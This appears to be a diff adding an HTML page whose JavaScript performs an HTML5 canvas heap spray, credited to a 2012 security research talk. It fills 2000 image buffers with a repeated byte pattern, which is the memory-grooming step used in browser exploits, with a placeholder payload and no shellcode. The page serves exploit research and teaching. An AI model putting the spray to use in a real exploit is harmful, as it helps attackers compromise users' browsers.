@@ -1,0 +1,31 @@
+<!-- Taken from Core Security Research: http://exploiting.wordpress.com/2012/10/03/html5-heap-spray-eusecwest-2012/ -->
+<!DOCTYPE html>
+<html>
+<head>
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge;chrome=1" >
+</head>
+<body>
+<script>
+var memory = Array();
+function fill (imgd, payload){
+        for(var i=0; i<imgd.data.length; i++){ //length=262144
+                imgd.data[i] = payload[i % payload.length];
+        };
+};
+
+window.onload = function(){
+        var payload = [0x47, 0x48, 0x41, 0x74];
+        for (var i=0; i< 2000; i++){
+                var elem = document.createElement('canvas');
+                elem.width = 256;
+                elem.height = 256;
+                var context = elem.getContext('2d');
+                var imgd = context.createImageData(256, 256);
+                fill(imgd, payload);
+                memory[i] = imgd
+        }
+        alert("spray done");
+}
+</script>
+</body>
+</html>
